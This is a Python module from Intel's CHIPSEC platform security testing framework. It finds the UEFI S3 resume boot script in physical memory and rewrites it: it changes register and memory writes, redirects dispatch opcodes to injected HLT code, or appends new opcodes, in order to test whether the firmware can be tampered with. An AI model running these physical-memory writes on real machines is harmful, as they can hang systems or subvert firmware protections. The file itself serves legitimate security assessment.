#CHIPSEC: Platform Security Assessment Framework
#Copyright (c) 2010-2015, Intel Corporation
# 
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; Version 2.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
#Contact information:
#chipsec@intel.com
#



"""
.. note:: This module will attempt to modify the S3 Boot Script on the platform. Doing this could cause the platform to malfunction. Use with care!

 Examples:
   ``chipsec_main.py -m tools.uefi.s3script_modify -a <reg_opcode>,<address>,<value>``
       <reg_opcode> = pci_wr|mmio_wr|io_wr|pci_rw|mmio_rw|io_rw
       The option will look for a script opcode that writes to PCI config, MMIO or I/O
       registers and modify the opcode to write the given value to the register with
       the given address.
       After executing this, if the system is vulnerable to boot script modification, 
       the hardware configuration will have changed according to given <reg_opcode>.
   ``chipsec_main.py -m tools.uefi.s3script_modify -a mem``
       The option will look for a script opcode that writes to memory and
       modify the opcode to write the given value to the given address.
       By default this test will allocate memory and write write 0xB007B007 that location.
       After executing this, if the system is vulnerable to boot script modification, you 
       should find the given value in the allocated memory location.
   ``chipsec_main.py -m tools.uefi.s3script_modify -a dispatch``
       The modify_dispatch option will look for a dispatch opcode in the script and
       modify the opcode to point to a different entry point. The new entry point will
       contain a HLT instruction. 
       After executing this, if the system is vulnerable to boot script modification, 
       the system should hang on resume from S3.
   ``chipsec_main.py -m tools.uefi.s3script_modify -a dispatch_ep``
       The modify_dispatch_ep option will look for a dispatch opcode in the script and
       will modify memory at the entry point for that opcode. The modified instructions 
       will contain a HLT instruction. 
       After executing this, if the system is vulnerable to dispatch opcode entry point 
       modification, the system should hang on resume from S3.
"""

examples_str = """  Examples:
    Replacing existing opcode:
    chipsec_main.py -m tools.uefi.s3script_modify -a replace_op,<reg_opcode>,<address>,<value>
       <reg_opcode> = pci_wr|mmio_wr|io_wr|pci_rw|mmio_rw|io_rw
    chipsec_main.py -m tools.uefi.s3script_modify -a replace_op,mem[,<address>,<value>]
    chipsec_main.py -m tools.uefi.s3script_modify -a replace_op,dispatch
    chipsec_main.py -m tools.uefi.s3script_modify -a replace_op,dispatch_ep

    Adding new opcode:
    chipsec_main.py -m tools.uefi.s3script_modify -a add_op,<reg_opcode>,<address>,<value>,<width>
       <reg_opcode> = pci_wr|mmio_wr|io_wr
    chipsec_main.py -m tools.uefi.s3script_modify -a add_op,dispatch[,<entrypoint>]

"""


from chipsec.module_common import *

from chipsec.hal.msr import *
import chipsec.hal.uefi
import chipsec.hal.uefi_common
import chipsec.hal.uefi_platform
from chipsec.hal.physmem import *

########################################################################################################
#
# Main module functionality
#
########################################################################################################

cmd2opcode = {
'pci_wr' : chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE, 
'mmio_wr': chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE,
'io_wr'  : chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_IO_WRITE_OPCODE,
'pci_rw' : chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE, 
'mmio_rw': chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE,
'io_rw'  : chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE

}


class s3script_modify(BaseModule):

    DISPATCH_ENTRYPOINT_INSTR = '\x90\x90\xF4\xF4'

    def __init__(self):
        BaseModule.__init__(self)
        self.logger.HAL = True
        self._uefi = chipsec.hal.uefi.UEFI( self.cs )
        self.bootscript_PAs = None
        self.parsed_scripts = None

    def get_bootscript(self):
        if self.bootscript_PAs == None or self.parsed_scripts == None:
            (self.bootscript_PAs,self.parsed_scripts) = self._uefi.get_s3_bootscript( False )
        return (self.bootscript_PAs, self.parsed_scripts)

    def is_supported(self):
        supported = self.cs.helper.EFI_supported()
        if not supported: self.logger.log_skipped_check( "OS does not support UEFI Runtime API" )
        return supported

    def modify_s3_reg( self, opcode, address, new_value ):
        (bootscript_PAs, parsed_scripts) = self.get_bootscript()
        for bootscript_pa in bootscript_PAs:
            if (bootscript_pa == 0): continue
            self.logger.log( "[*] Looking for 0x%X opcode in the script at 0x%016X.." % (opcode,bootscript_pa) )
            for e in parsed_scripts[ bootscript_pa ]:
                if e.decoded_opcode is not None       and \
                   opcode  == e.decoded_opcode.opcode and \
                   address == e.decoded_opcode.address:

                    self.logger.log_good( "Found opcode at offset 0x%04X" % e.offset_in_script )
                    self.logger.log( e )
                    pa = bootscript_pa + e.offset_in_script
                    self.logger.log( "[*] Modifying S3 boot script entry at address 0x%016X.." % pa )

                    orig_entry_buf = self.cs.mem.read_physical_mem( pa, e.length )
                    self.logger.log( "[*] Original entry:" )
                    print_buffer( orig_entry_buf )

                    if chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE == opcode or \
                       chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE        == opcode or \
                       chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_IO_WRITE_OPCODE         == opcode:
                        e.decoded_opcode.values[0] = new_value
                    else:
                        e.decoded_opcode.value = new_value

                    entry_buf = chipsec.hal.uefi_platform.encode_s3bootscript_entry( e )
                    self.cs.mem.write_physical_mem( pa, e.length, entry_buf )

                    new_entry_buf = self.cs.mem.read_physical_mem( pa, e.length )
                    self.logger.log( "[*] Modified entry:" )
                    print_buffer( new_entry_buf )
                    return True

        self.logger.log_bad( "Did not find required 0x%X opcode in the script" % opcode )
        return False

    def modify_s3_dispatch( self ):
        ep_size   = len(self.DISPATCH_ENTRYPOINT_INSTR)
        (smram_base, smram_limit, smram_size) = self.cs.cpu.get_SMRAM()
        (ep_va, new_entrypoint) = self.cs.mem.alloc_physical_mem( ep_size, smram_base )
        self.cs.mem.write_physical_mem( new_entrypoint, ep_size, self.DISPATCH_ENTRYPOINT_INSTR )
        new_ep = self.cs.mem.read_physical_mem( new_entrypoint, ep_size )
        self.logger.log_good( "Allocated new DISPATCH entry-point at 0x%016X (size = 0x%X):" % (new_entrypoint,ep_size) )
        print_buffer( new_ep )

        (bootscript_PAs, parsed_scripts) = self.get_bootscript()
        for bootscript_pa in bootscript_PAs:
            if (bootscript_pa == 0): continue
            self.logger.log( "[*] Searching the script at 0x%016X for DISPATCH opcodes.." % bootscript_pa )
            for e in parsed_scripts[ bootscript_pa ]:
                if e.decoded_opcode is not None and \
                   chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_DISPATCH_OPCODE == e.decoded_opcode.opcode:

                    self.logger.log_good( "Found DISPATCH opcode at offset 0x%04X" % e.offset_in_script )
                    self.logger.log( e )
                    pa = bootscript_pa + e.offset_in_script
                    self.logger.log( "[*] Modifying S3 boot script entry at address 0x%016X.." % pa )

                    orig_entry_buf = self.cs.mem.read_physical_mem( pa, e.length )
                    self.logger.log( "[*] Original entry:" )
                    print_buffer( orig_entry_buf )

                    e.decoded_opcode.entrypoint = new_entrypoint
                    entry_buf = chipsec.hal.uefi_platform.encode_s3bootscript_entry( e )
                    self.cs.mem.write_physical_mem( pa, e.length, entry_buf )

                    new_entry_buf = self.cs.mem.read_physical_mem( pa, e.length )
                    self.logger.log( "[*] Modified entry:" )
                    print_buffer( new_entry_buf )
                    self.logger.log('After sleep/resume, the system should hang' )
                    return True

        self.logger.log_bad( "Did not find any suitable DISPATCH opcodes" )
        return False

    def modify_s3_dispatch_ep( self ):
        ep_pa = None
        (bootscript_PAs, parsed_scripts) = self.get_bootscript()
        for script_pa in bootscript_PAs:
            if (script_pa == 0): continue
            self.logger.log( "[*] Looking for DISPATCH opcode in the script at 0x%016X.." % script_pa )
            for e in parsed_scripts[ script_pa ]:
                if e.decoded_opcode is not None and \
                   chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_DISPATCH_OPCODE == e.decoded_opcode.opcode:
                    ep_pa = e.decoded_opcode.entrypoint
                    self.logger.log_good( "Found DISPATCH opcode at offset 0x%04X with entry-point 0x%016X" % (e.offset_in_script,ep_pa) )
                    self.logger.log( e )
                    break
            if ep_pa is not None: break

        if ep_pa is None:
            self.logger.log_bad( "Didn't find any DISPATCH opcodes" )
            return False

        ep_size = len(self.DISPATCH_ENTRYPOINT_INSTR)
        self.cs.mem.write_physical_mem( ep_pa, ep_size, self.DISPATCH_ENTRYPOINT_INSTR )
        new_ep = self.cs.mem.read_physical_mem( ep_pa, ep_size )
        self.logger.log( "[*] New DISPATCH entry-point at 0x%016X (size = 0x%X):" % (ep_pa,ep_size) )
        print_buffer( new_ep )
        return True


    def modify_s3_mem( self, address, new_value ):
        if address is None:
            (smram_base, smram_limit, smram_size) = self.cs.cpu.get_SMRAM()
            (va, address) = self.cs.mem.alloc_physical_mem( 0x1000, smram_base )
            self.logger.log( "[*] Allocated memory at 0x%016X as a target of MEM_WRITE opcode" % address )

        val = self.cs.mem.read_physical_mem_dword( address )
        self.logger.log( "[*] Original value at 0x%016X: 0x%08X" % (address,val) )

        (bootscript_PAs, parsed_scripts) = self.get_bootscript()
        for bootscript_pa in bootscript_PAs:
            if (bootscript_pa == 0): continue
            self.logger.log( "[*] Looking for MEM_WRITE opcode in the script at 0x%016X.." % bootscript_pa )
            for e in parsed_scripts[ bootscript_pa ]:
                if e.decoded_opcode is not None and \
                   chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE == e.decoded_opcode.opcode:

                    self.logger.log_good( "Found opcode at offset 0x%X" % e.offset_in_script )
                    self.logger.log( e )
                    pa = bootscript_pa + e.offset_in_script
                    self.logger.log( "[*] Modifying S3 boot script entry at address 0x%016X.." % pa )

                    orig_entry_buf = self.cs.mem.read_physical_mem( pa, e.length )
                    self.logger.log( "[*] Original entry:" )
                    print_buffer( orig_entry_buf )

                    e.decoded_opcode.address = address
                    e.decoded_opcode.values[0] = new_value
                    entry_buf = chipsec.hal.uefi_platform.encode_s3bootscript_entry( e )
                    self.cs.mem.write_physical_mem( pa, e.length, entry_buf )

                    new_entry_buf = self.cs.mem.read_physical_mem( pa, e.length )
                    self.logger.log( "[*] Modified entry:" )
                    print_buffer( new_entry_buf )
                    self.logger.log('After sleep/resume, read address 0x%08X and look for value 0x%08X' % (address, new_value))
                    return True

        self.logger.log_bad( "Did not find required 0x%X opcode in the script" % opcode )
        return False

    def modify_s3_add(self, new_opcode):
        e_index = None
        (bootscript_PAs, parsed_scripts) = self.get_bootscript()

        for bootscript_pa in bootscript_PAs:
            if (bootscript_pa == 0): continue
            script_buffer = self.cs.mem.read_physical_mem( bootscript_pa, 4 )
            script_type, hdr_len = chipsec.hal.uefi_platform.id_s3bootscript_type(script_buffer, False)
            self.logger.log( "[*] S3 boot script type: 0x%0X" % script_type )

            self.logger.log( "[*] Looking for TERMINATE opcode in the script at 0x%016X.." % bootscript_pa )
            for e in parsed_scripts[ bootscript_pa ]:
                if e.index is not None and e.index != -1: e_index = e.index + 1

                if e.decoded_opcode is not None and chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_TERMINATE_OPCODE == e.decoded_opcode.opcode:                  
                    self.logger.log_good( "Found TERMINATE opcode at offset 0x%X" % e.offset_in_script )
                    self.logger.log( e )
                    pa = bootscript_pa + e.offset_in_script
                    orig_entry_buf = self.cs.mem.read_physical_mem( pa, e.length )
                    #print_buffer( orig_entry_buf )

                    self.logger.log( "[*] New S3 boot script opcode:" )
                    self.logger.log( new_opcode )
                    self.logger.log( "[*] Adding new opcode entry at address 0x%016X.." % pa )
                    new_entry = chipsec.hal.uefi_platform.create_s3bootscript_entry_buffer( script_type, new_opcode, e_index )
                    print_buffer( new_entry )

                    self.cs.mem.write_physical_mem( pa, len(new_entry), new_entry )
                    last_entry_pa = pa + len(new_entry)
                    self.logger.log( "[*] Moving TERMINATE opcode to the last entry at 0x%016X.." % last_entry_pa )
                    self.cs.mem.write_physical_mem( last_entry_pa, len(orig_entry_buf), orig_entry_buf )
                    return True

        self.logger.log_bad( "Did not find TERMINATE opcode" )
        return False

    def run( self, module_argv ):
        self.logger.start_test( 'S3 Resume Boot-Script Testing' )
        sts = False
        op = module_argv[0].lower() if len(module_argv) > 0 else 'add_op'
        if (op == 'replace_op'):
            scmd = module_argv[1].lower() if len(module_argv) > 1 else 'dispatch_ep'
            if scmd in cmd2opcode:
                if len(module_argv) < 4:
                    self.logger.error( 'Expected module options: -a replace_op,%s,<reg_address>,<value>' % scmd )
                    return ModuleResult.ERROR
                reg_address = int(module_argv[2],16)
                value       = int(module_argv[3],16)
                sts = self.modify_s3_reg( cmd2opcode[scmd], reg_address, value )
                if sts: self.logger.log( '[*] After sleep/resume, check the value of register 0x%X is 0x%X' % (reg_address,value) )
            elif 'dispatch' == scmd:
                sts = self.modify_s3_dispatch()
            elif 'dispatch_ep' == scmd:
                sts = self.modify_s3_dispatch_ep()
            elif 'mem' == scmd:
                new_value = int(module_argv[2],16) if len(module_argv) >= 3 else 0xB007B007
                address   = int(module_argv[3],16) if len(module_argv) == 4 else None
                sts = self.modify_s3_mem( address, new_value )
            else:
                self.logger.error( "Unrecognized module command-line argument: %s" % scmd )
                self.logger.log( examples_str )
                return ModuleResult.ERROR
        elif (op == 'add_op'):
            scmd = module_argv[1].lower() if len(module_argv) > 1 else 'dispatch'
            new_opcode = None
            if scmd in cmd2opcode:
                if len(module_argv) < 5:
                    self.logger.error( 'Expected module options: -a add_op,%s,<reg_address>,<value>,<width>' % scmd )
                    return ModuleResult.ERROR
                address    = int(module_argv[2],16)
                value      = int(module_argv[3],16)
                width      = int(module_argv[4],16)
                width_val  = chipsec.hal.uefi_common.script_width_values[width]
                value_buff = struct.pack("<%s" % chipsec.hal.uefi_common.script_width_formats[width_val], value)
                if ( chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE == cmd2opcode[scmd]
                  or chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE == cmd2opcode[scmd]
                  or chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_IO_WRITE_OPCODE == cmd2opcode[scmd]):
                    new_opcode = chipsec.hal.uefi_common.op_io_pci_mem( cmd2opcode[scmd], None, width_val, address, 0, 1, value_buff, None, None )
                else:
                    self.logger.error( "Unsupported opcode: %s" % scmd )
                    self.logger.log( examples_str )
                    return ModuleResult.ERROR
            elif 'dispatch' == scmd:
                if len(module_argv) < 3:
                    (smram_base, smram_limit, smram_size) = self.cs.cpu.get_SMRAM()
                    (va, entrypoint) = self.cs.mem.alloc_physical_mem( 0x1000, smram_base )
                    self.cs.mem.write_physical_mem( entrypoint, len(self.DISPATCH_ENTRYPOINT_INSTR), self.DISPATCH_ENTRYPOINT_INSTR )
                else:
                    entrypoint = int(module_argv[2],16)
                new_opcode = chipsec.hal.uefi_common.op_dispatch( chipsec.hal.uefi_common.S3BootScriptOpcode.EFI_BOOT_SCRIPT_DISPATCH_OPCODE, None, entrypoint )
            else:
                self.logger.error( "Unrecognized opcode: %s" % scmd )
                self.logger.log( examples_str )
                return ModuleResult.ERROR

            sts = self.modify_s3_add( new_opcode )
        else:
            self.logger.error( "Unrecognized module command-line argument: %s" % op )
            self.logger.log( examples_str )
            return ModuleResult.ERROR

        if sts:
            self.logger.log_passed_check( 'The script has been modified. Go to sleep..' )
            return ModuleResult.PASSED
        else:
            return ModuleResult.FAILED

